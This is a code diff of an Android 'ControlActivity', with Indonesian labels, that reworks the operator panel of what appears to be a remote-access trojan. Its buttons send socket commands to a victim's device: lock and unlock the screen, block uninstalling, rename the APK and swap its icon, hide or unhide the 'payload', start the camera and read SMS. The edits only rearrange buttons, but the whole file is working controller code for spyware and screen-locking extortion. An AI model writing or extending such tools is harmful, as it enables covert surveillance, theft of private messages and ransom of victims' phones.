@@ -31,7 +31,6 @@ public class ControlActivity extends Activity {
         String model = getIntent().getStringExtra("deviceModel");
         String battery = getIntent().getStringExtra("battery");
 
-        // Root dengan ScrollView
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
         root.setBackgroundColor(0xFF090909);
@@ -43,7 +42,7 @@ public class ControlActivity extends Activity {
         content.setOrientation(LinearLayout.VERTICAL);
         content.setPadding(0, 0, 0, 32);
 
-        // ===== HEADER =====
+        // Header
         LinearLayout header = new LinearLayout(this);
         header.setOrientation(LinearLayout.HORIZONTAL);
         header.setGravity(Gravity.CENTER_VERTICAL);
@@ -76,46 +75,31 @@ public class ControlActivity extends Activity {
         header.addView(notif);
         content.addView(header);
 
-        // ===== LOCK / UNLOCK =====
-        LinearLayout lockPanel = new LinearLayout(this);
-        lockPanel.setOrientation(LinearLayout.HORIZONTAL);
-        lockPanel.setGravity(Gravity.CENTER);
-        lockPanel.setPadding(12, 10, 12, 6);
+        // Tombol Utama: Lock Screen, Unlock, Anti-Uninstall, Tools (Rename, Icon, Payload)
+        LinearLayout mainActions = new LinearLayout(this);
+        mainActions.setOrientation(LinearLayout.HORIZONTAL);
+        mainActions.setGravity(Gravity.CENTER);
+        mainActions.setPadding(12, 12, 12, 8);
 
-        Button lockBtn = createActionBtn("Lock", "#FF1744");
-        lockBtn.setOnClickListener(v -> showLockScreenDialog());
-        lockPanel.addView(lockBtn);
+        Button lockScreenBtn = createIconButton("Lock", "🔒", "#FF1744", v -> showLockScreenDialog());
+        mainActions.addView(lockScreenBtn);
 
-        Button unlockBtn = createActionBtn("Unlock", "#00E676");
-        unlockBtn.setOnClickListener(v -> sendCmd("unlock"));
-        lockPanel.addView(unlockBtn);
-        content.addView(lockPanel);
+        Button unlockBtn = createIconButton("Unlock", "🔓", "#00E676", v -> sendCmd("unlock"));
+        mainActions.addView(unlockBtn);
 
-        // ===== TOOLS =====
-        LinearLayout toolsPanel = new LinearLayout(this);
-        toolsPanel.setOrientation(LinearLayout.HORIZONTAL);
-        toolsPanel.setGravity(Gravity.CENTER);
-        toolsPanel.setPadding(12, 4, 12, 8);
+        Button antiUninstallBtn = createIconButton("Anti-Uninstall", "🛡️", "#2196F3", v -> showAntiUninstallDialog());
+        mainActions.addView(antiUninstallBtn);
 
-        Button antiBtn = createToolBtn("Anti‑Uninstall", "#2196F3", v -> showAntiUninstallDialog());
-        toolsPanel.addView(antiBtn);
+        Button toolsBtn = createIconButton("Tools", "⚙️", "#9C27B0", v -> showToolsDialog());
+        mainActions.addView(toolsBtn);
 
-        Button renameBtn = createToolBtn("Rename", "#9C27B0", v -> showRenameDialog());
-        toolsPanel.addView(renameBtn);
+        content.addView(mainActions);
 
-        Button iconBtn = createToolBtn("Icon", "#FF9800", v -> showChangeIconDialog());
-        toolsPanel.addView(iconBtn);
-
-        Button payloadBtn = createToolBtn("Payload", "#00BCD4", v -> showPayloadDialog());
-        toolsPanel.addView(payloadBtn);
-        content.addView(toolsPanel);
-
-        // ===== GRID 3 KOLOM =====
+        // Grid Menu 3 kolom
         LinearLayout grid = new LinearLayout(this);
         grid.setOrientation(LinearLayout.VERTICAL);
         grid.setPadding(12, 8, 12, 12);
 
-        // Data: label, warna, command
         String[][] items = {
             {"Camera", "#FF1744", "start_camera"},
             {"SMS", "#FF4D8D", "get_sms"},
@@ -142,7 +126,7 @@ public class ControlActivity extends Activity {
         }
         content.addView(grid);
 
-        // ===== CONTROL CENTER =====
+        // Control Center
         TextView controlCenter = new TextView(this);
         controlCenter.setText("Control Center");
         controlCenter.setTextColor(0xFFFFFFFF);
@@ -166,27 +150,14 @@ public class ControlActivity extends Activity {
         } catch (URISyntaxException e) {}
     }
 
-    // ===== HELPER BUTTONS =====
-    private Button createActionBtn(String text, String color) {
+    private Button createIconButton(String text, String icon, String color, android.view.View.OnClickListener listener) {
         Button btn = new Button(this);
-        btn.setText(text);
+        btn.setText(icon + " " + text);
         btn.setTextColor(0xFFFFFFFF);
         btn.setBackgroundColor((int) Long.parseLong(color.substring(1), 16));
         btn.setGravity(Gravity.CENTER);
         LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 52, 1);
         p.setMargins(4, 0, 4, 0);
-        btn.setLayoutParams(p);
-        return btn;
-    }
-
-    private Button createToolBtn(String text, String color, android.view.View.OnClickListener listener) {
-        Button btn = new Button(this);
-        btn.setText(text);
-        btn.setTextColor(0xFFFFFFFF);
-        btn.setBackgroundColor((int) Long.parseLong(color.substring(1), 16));
-        btn.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 44, 1);
-        p.setMargins(3, 0, 3, 0);
         btn.setLayoutParams(p);
         btn.setOnClickListener(listener);
         return btn;
@@ -202,7 +173,6 @@ public class ControlActivity extends Activity {
         p.setMargins(4, 4, 4, 4);
         card.setLayoutParams(p);
 
-        // Ikon sederhana (bukan stiker)
         TextView icon = new TextView(this);
         icon.setText(getIconForCmd(cmd));
         icon.setTextColor(0xFFFFFFFF);
@@ -249,10 +219,82 @@ public class ControlActivity extends Activity {
         }
     }
 
-    // ===== DIALOGS =====
+    private void showToolsDialog() {
+        AlertDialog.Builder b = new AlertDialog.Builder(this);
+        b.setTitle("Tools");
+        LinearLayout lay = new LinearLayout(this);
+        lay.setOrientation(LinearLayout.VERTICAL);
+        lay.setPadding(24, 16, 24, 16);
+
+        // Rename APK
+        EditText renameInput = new EditText(this);
+        renameInput.setHint("Nama baru APK");
+        renameInput.setTextColor(0xFFFFFFFF);
+        renameInput.setBackgroundColor(0xFF252525);
+        renameInput.setPadding(16, 12, 16, 12);
+        lay.addView(renameInput);
+
+        Button renameBtn = new Button(this);
+        renameBtn.setText("✏️ Rename APK");
+        renameBtn.setTextColor(0xFFFFFFFF);
+        renameBtn.setBackgroundColor(0xFF9C27B0);
+        renameBtn.setOnClickListener(v -> {
+            String name = renameInput.getText().toString().trim();
+            if (!name.isEmpty()) {
+                try { sendCmd("rename_app", new JSONObject().put("newName", name)); } catch (Exception e) {}
+            }
+        });
+        lay.addView(renameBtn);
+
+        // Ganti Ikon via URL
+        EditText iconInput = new EditText(this);
+        iconInput.setHint("URL gambar ikon");
+        iconInput.setTextColor(0xFFFFFFFF);
+        iconInput.setBackgroundColor(0xFF252525);
+        iconInput.setPadding(16, 12, 16, 12);
+        lay.addView(iconInput);
+
+        Button iconBtn = new Button(this);
+        iconBtn.setText("🖼️ Ganti Ikon");
+        iconBtn.setTextColor(0xFFFFFFFF);
+        iconBtn.setBackgroundColor(0xFFFF9800);
+        iconBtn.setOnClickListener(v -> {
+            String url = iconInput.getText().toString().trim();
+            if (!url.isEmpty()) {
+                try { sendCmd("change_icon", new JSONObject().put("url", url)); } catch (Exception e) {}
+            }
+        });
+        lay.addView(iconBtn);
+
+        // Payload Hide/Unhide
+        LinearLayout payloadRow = new LinearLayout(this);
+        payloadRow.setOrientation(LinearLayout.HORIZONTAL);
+        payloadRow.setGravity(Gravity.CENTER);
+
+        Button hideBtn = new Button(this);
+        hideBtn.setText("👻 Hide Payload");
+        hideBtn.setTextColor(0xFFFFFFFF);
+        hideBtn.setBackgroundColor(0xFFFF1744);
+        hideBtn.setOnClickListener(v -> sendCmd("hide_app"));
+        payloadRow.addView(hideBtn);
+
+        Button unhideBtn = new Button(this);
+        unhideBtn.setText("👁️ Unhide Payload");
+        unhideBtn.setTextColor(0xFFFFFFFF);
+        unhideBtn.setBackgroundColor(0xFF00E676);
+        unhideBtn.setOnClickListener(v -> sendCmd("unhide_app"));
+        payloadRow.addView(unhideBtn);
+
+        lay.addView(payloadRow);
+
+        b.setView(lay);
+        b.setNegativeButton("Tutup", null);
+        b.show();
+    }
+
     private void showAntiUninstallDialog() {
         AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle("Anti‑Uninstall");
+        b.setTitle("Anti-Uninstall");
         CheckBox toggle = new CheckBox(this);
         toggle.setText("Aktifkan");
         toggle.setTextColor(0xFFFFFFFF);
@@ -262,69 +304,6 @@ public class ControlActivity extends Activity {
             try { sendCmd("anti_uninstall", new JSONObject().put("state", toggle.isChecked())); } catch (Exception e) {}
         });
         b.setNegativeButton("Batal", null);
-        b.show();
-    }
-
-    private void showRenameDialog() {
-        AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle("Rename APK");
-        EditText input = new EditText(this);
-        input.setHint("Nama baru");
-        input.setTextColor(0xFFFFFFFF);
-        input.setBackgroundColor(0xFF252525);
-        b.setView(input);
-        b.setPositiveButton("Ubah", (d, w) -> {
-            String name = input.getText().toString().trim();
-            if (!name.isEmpty()) {
-                try { sendCmd("rename_app", new JSONObject().put("newName", name)); } catch (Exception e) {}
-            }
-        });
-        b.setNegativeButton("Batal", null);
-        b.show();
-    }
-
-    private void showChangeIconDialog() {
-        AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle("Ganti Ikon");
-        EditText input = new EditText(this);
-        input.setHint("URL gambar");
-        input.setTextColor(0xFFFFFFFF);
-        input.setBackgroundColor(0xFF252525);
-        b.setView(input);
-        b.setPositiveButton("Ganti", (d, w) -> {
-            String url = input.getText().toString().trim();
-            if (!url.isEmpty()) {
-                try { sendCmd("change_icon", new JSONObject().put("url", url)); } catch (Exception e) {}
-            }
-        });
-        b.setNegativeButton("Batal", null);
-        b.show();
-    }
-
-    private void showPayloadDialog() {
-        AlertDialog.Builder b = new AlertDialog.Builder(this);
-        b.setTitle("Payload");
-        LinearLayout lay = new LinearLayout(this);
-        lay.setOrientation(LinearLayout.HORIZONTAL);
-        lay.setGravity(Gravity.CENTER);
-        lay.setPadding(16, 16, 16, 16);
-
-        Button hide = new Button(this);
-        hide.setText("Hide");
-        hide.setTextColor(0xFFFFFFFF);
-        hide.setBackgroundColor(0xFFFF1744);
-        hide.setOnClickListener(v -> sendCmd("hide_app"));
-        lay.addView(hide);
-
-        Button unhide = new Button(this);
-        unhide.setText("Unhide");
-        unhide.setTextColor(0xFFFFFFFF);
-        unhide.setBackgroundColor(0xFF00E676);
-        unhide.setOnClickListener(v -> sendCmd("unhide_app"));
-        lay.addView(unhide);
-
-        b.setView(lay);
-        b.setNegativeButton("Tutup", null);
         b.show();
     }
 
@@ -349,7 +328,6 @@ public class ControlActivity extends Activity {
         title.setTextColor(0xFFFFFFFF);
         title.setTextSize(20);
         title.setTypeface(null, android.graphics.Typeface.BOLD);
-        title.setPadding(0, 0, 0, 16);
         container.addView(title);
 
         EditText htmlEditor = new EditText(this);
@@ -485,7 +463,7 @@ public class ControlActivity extends Activity {
                 msg.put("command", cmd);
                 msg.put("params", params);
                 socket.emit("command", msg);
-                Toast.makeText(this, "Ok " + cmd, Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "Ok", Toast.LENGTH_SHORT).show();
             } catch (Exception e) {}
         } else {
             Toast.makeText(this, "Offline", Toast.LENGTH_SHORT).show();
